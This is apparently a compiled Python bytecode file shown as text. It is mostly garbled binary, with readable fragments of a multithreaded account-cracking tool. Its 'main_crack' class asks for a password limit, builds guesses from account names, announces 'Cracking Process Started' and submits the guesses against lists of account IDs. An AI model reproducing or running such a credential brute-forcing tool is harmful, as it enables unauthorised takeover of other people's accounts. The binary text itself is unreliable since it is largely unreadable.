�  eu�  w{�  (
�  }M	�  O	Y	�  (
�  [	l	�  n	A
�  (
�  C
T
�  V
~
�  (
�  @�  @�  @�"�<�<�(r�x~�  PU�<�  V�  V���w��7�7�9�9�9�9��<�q�<�<�C�<�<�B�<�<��<�<�=�=�=��J�J�s�O�O�O��-�c�2�2�8�8��S����D��I�I�I��E�!�W�_�%=�%=�%?�%?�?�?��J�J�s�O�O�O��-�c�2�2�8�8��S����D��I�I�I��E�� �!�G�D�D�D���"�2� 	)� 	)� 	)��\�\�#�t�R�(�(�(�(�(�(�	)���s   �C; �;D�KO �+P	�P	c                 �H  � g }t          �   �          t          t          t          � dt          � dt          � dt          � d��  �        �  �        }t          j        d�  �         t          t          �  �         t          t          � dt          � dt          � dt          � d��  �         t          d�  �         |dk    r(t          t          � dt          � dt          � d	��  �         n�|d
k    r0t          t          � dt          � dt          � dt          � d��  �         npt          |�  �        D ]`}|�
                    t          t          � dt          � dt          � dt          � dt          � |dz   � t          � dt          � d��  �        �  �         �at          j        d�  �         t          t          �  �         t          t          � dt          � dt          � dt          � d�t          | j        �  �        z  �  �         t          t          � dt          � dt          � dt          � d��  �         t          d�  �         t          d��  �        5 }| j        D �]%}	 |�                    d�  �        \  }}|�                    d�  �        }t          |�  �        dk    s9t          |�  �        dk    s&t          |�  �        dk    st          |�  �        dk    r|}	n�|}	dt          v r|�                    | j        |||	�  �         ntdt          v r|�                    | j        |||	�  �         nMdt          v r|�                    | j        |||	�  �         n&dt          v r|�                    | j        |||	�  �         ��#  Y ��$xY w	 d d d �  �         n# 1 swxY w Y   t+          t,          t.          �  �         d S )Nr@   rC   rl   z Enter your password limit : r   z Example: first123,last123r7   r�   z] Put limit between 1 to 30�   z- Password limit Should Not Be Greater Than 30z] Password r   z] :rv   z] Total IDs : z%s z Cracking Process Started �   r   r�   r]   r   �   r   r^   r_   r`   r  )r   �intr:   rN   rO   r2   r   r3   r4   �rangerb   r8   re   �
sarfrazssbr�   ra   �submitr^   r_   r`   r  r>   r9   r=   )
ri   r�   �sl�sr�ssbworld�zsbr  r~   �sz�pwxs
             r(   rq   zmain_crack.pasw�  s�  � ��B��G�G�G��U�a�J�J�!�J�J�a�J�J�!�J�J�J�K�K�L�L�B��I�g�����$�K�K�K��Q�>�>��>�>�Q�>�>��>�>�>�?�?�?��  c�  d�  d�  d��B�w�w���?�?�Q�?�?��?�?�?�@�@�@�@��b�����U�U�Q�U�U��U�U�Q�U�U�U�V�V�V�V���)�)� W� W�B��I�I�e�q�$T�$T�1�$T�$T�q�$T�$T�Q�$T�$T��$T�B�q�D�$T�!�$T�$T�PQ�$T�$T�$T�U�U�V�V�V�V��I�g�����$�K�K�K� �Q�4�4��4�4�Q�4�4�a�4�4�4�s�4�7�|�|�C�D�D�D��Q�>�>��>�>�Q�>�>��>�>�>�?�?�?��  c�  d�  d�  d���+�+�+� �x��7� � �C��#&�9�9�S�>�>�y�s�D� �J�J�s�O�O�r��b�'�'�Q�,�,�#�b�'�'�Q�,�,�#�b�'�'�Q�,�,�#�b�'�'�UV�,�,�"$�3�3�#%�C�(�G�3�3� (�����c�4�� M� M� M� M�!*�g�!5�!5� (�����c�4�� M� M� M� M�!*�g�!5�!5� (�����c�4�� M� M� M� M�!*�g�!5�!5� (�����c�4�� M� M� M����$�$����!�� � � � � � � � � � ���� � � � �$ �3�s�O�O�O�O�Os+   �M=�DM(�&M=�(M-�*M=�=N�NN)
�__name__�
__module__�__qualname__rj   rd   r^   r`   r_   r  rq   r5   r*   r(   rc   rc   �   s�   � � � � � �� � �#� #� #�$@(� @(� @(�D@(� @(� @(�DA(� A(� A(�F#)� #)� #)�J*� *� *� *� *r*   rc   )Jr2   �zlibr   �osRUB�cmdr3   r�   �ImportError�concurrent.futures�
concurrent�	mechanize�ModuleNotFoundError�urllib.requestr   r   r  �platformr�   r!   �
subprocess�	threading�	itertoolsr�   r�   r�   �shutil�
webbrowserrW   �datetime�stringr   r#  r	   r
   �slpr   r$  �	fast_workr  r  rp   r#   �totaldmp�countr�   r9   r=   re   r�   r�   �totalra   �srange�saved�filterr)   r�   r�   r�   r,   r�   r�   rN   r�   rO   rL   �Z�headr4   r   r>   r[   rP   rc   r5   r*   r(   �<module>rI     s�  �� �������� � � � � � � � � � � � � 	��	�'� � � � ��� � � �&��O�O�O�O��� &� &� &�	�E�
%�&�&�&��B�I�$�%�%�%�%�%�&����
%�������� %� %� %�	�E�
$�%�%�%��B�I�#�$�$�$�$�$�%����3�������� 3� 3� 3��B�I�1�2�2�2�2�2�3���� ,� +� +� +� +� +� +� +� p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p�  p� ?� ?� ?� ?� ?� ?� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � 1� 1� 1� 1� 1� 1���2�.�.�.�5�	� 
���  [�  
\�  
\�  
a�  
l�  
l�  
n�  
n����	����������������
��	
��
����	��� � � ^�� V�� ^��� � �
 �
� � �(� )� )� )�����������)�8b�v{�|�|��56� 
1S� 
1S� 12�
1S� 
1S� 
1S��� � �	� 	� 	�!� !� !�F� � �:k� k� k� k� k� k� k� k�`	 ��	�	�	�	�	s3   �6 � A�A�A" �" B�B�	B �B&�%B&